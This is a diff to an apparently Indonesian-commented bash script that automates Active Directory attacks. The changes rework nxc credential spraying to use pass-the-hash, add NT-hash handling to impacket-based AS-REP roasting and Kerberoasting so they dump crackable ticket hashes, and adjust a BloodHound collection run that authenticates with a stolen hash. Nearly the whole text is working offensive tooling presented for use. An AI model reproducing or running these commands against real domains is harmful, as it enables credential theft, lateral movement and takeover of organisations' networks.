@@ -25,7 +25,7 @@ FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
 echo "" > "$FINAL_CRACKED"
 
 echo -e "${PURPLE}====================================================${NC}"
-echo -e "${GREEN}[+] Spray Auth All Protocol${NC}"
+echo -e "${GREEN}[+] Spray Auth All Protocol with HASH / PTH ${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
 # Validasi File
@@ -145,7 +145,7 @@ run_nxc() {
     while (( attempt <= MAX_RETRY )); do
       echo -e "\n${PURPLE}[EXEC][Attempt $attempt] nxc $proto $ip -u '$user' -H '$pass' $extra $domain_flag${NC}"
 
-      timeout 25s nxc "$proto" "$ip" -u "$user" -H"$pass" $extra $domain_flag --no-progress > .tmp_res 2>&1
+      timeout 25s nxc "$proto" "$ip" -u "$user" -H "$pass" $extra $domain_flag --no-progress > .tmp_res 2>&1
       exit_code=$?
 
       cat .tmp_res
@@ -289,12 +289,20 @@ for ip in "${!PROTO_MAP[@]}"; do
                             printf "%s\n" "${MAPFILE_U[@]}" > "$USERS_FILE"
                         fi
 
-                        timeout 30s impacket-GetNPUsers "$DOMAIN/$user:$pass" \
-                            -dc-ip "$dc_ip" \
-                            -request \
-                            -format hashcat \
-                            -outputfile "$ASREP_HASH_FILE" >/dev/null 2>&1
+                        # Jika $pass tidak diawali dengan ':', dan tidak mengandung ':' di tengahnya,
+                        # otomatis tambahkan ':' di depannya agar formatnya menjadi :NTHASH.
+                        if [[ "$pass" != *:* ]]; then
+                            target_hash=":$pass"
+                        else
+                            target_hash="$pass"
+                        fi
 
+                        timeout 30s impacket-GetNPUsers "$DOMAIN/$user" \
+                                    -hashes "$target_hash" \
+                                    -dc-ip "$dc_ip" \
+                                    -request \
+                                    -format hashcat \
+                                    -outputfile "$ASREP_HASH_FILE" >/dev/null 2>&1
 
                         if [[ -s "$ASREP_HASH_FILE" ]]; then
                             echo -e "${RED}[!] ASREP hash found:${NC}"
@@ -331,10 +339,18 @@ for ip in "${!PROTO_MAP[@]}"; do
 
                         KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
 
-                        timeout 30s impacket-GetUserSPNs "$DOMAIN/$user:$pass" \
-                            -dc-ip "$dc_ip" \
-                            -request \
-                            -outputfile "$KERB_HASH_FILE" >/dev/null 2>&1
+                        # Memastikan format hash memiliki ':' di depannya jika hanya berupa NT hash murni
+                        if [[ "$pass" != *:* ]]; then
+                            target_hash=":$pass"
+                        else
+                            target_hash="$pass"
+                        fi
+
+                        timeout 30s impacket-GetUserSPNs "$DOMAIN/$user" \
+                                    -hashes "$target_hash" \
+                                    -dc-ip "$dc_ip" \
+                                    -request \
+                                    -outputfile "$KERB_HASH_FILE" >/dev/null 2>&1
 
 
                         if [[ -s "$KERB_HASH_FILE" ]]; then
@@ -458,7 +474,7 @@ for ip in "${!PROTO_MAP[@]}"; do
                             # Bersihkan temporary files
                             rm -f .tmp_nopac .tmp_ntlmref .tmp_coerce_auth
 
-                       # -------------------------------------------------------
+                            # -------------------------------------------------------
                             # 3. BLOODHOUND INGESTION (Python Collector)
                             # -------------------------------------------------------
                             echo -e "\n${YELLOW}[*] AD Recon: Running BloodHound Python Ingestor...${NC}"
@@ -512,7 +528,7 @@ for ip in "${!PROTO_MAP[@]}"; do
                             # Jalankan di subshell agar tidak mengubah directory kerja script utama
                             (
                                 cd "$BH_DIR" || exit
-                                timeout 2000s bloodhound-python -d "$CLEAN_DOMAIN" -dc "$DC_FQDN" -u "$user" --hashes "aad3b435b51404eeaad3b435b51404ee:$NT_HASH" -ns "$ip" -c all --zip 2>&1 | tee .tmp_bh
+                                timeout 150s bloodhound-python -d "$CLEAN_DOMAIN" -dc "$DC_FQDN" -u "$user" --hashes "aad3b435b51404eeaad3b435b51404ee:$NT_HASH" -ns "$ip" -c all --zip 2>&1 | tee .tmp_bh
                             )
 
                             # Verifikasi hasil dump
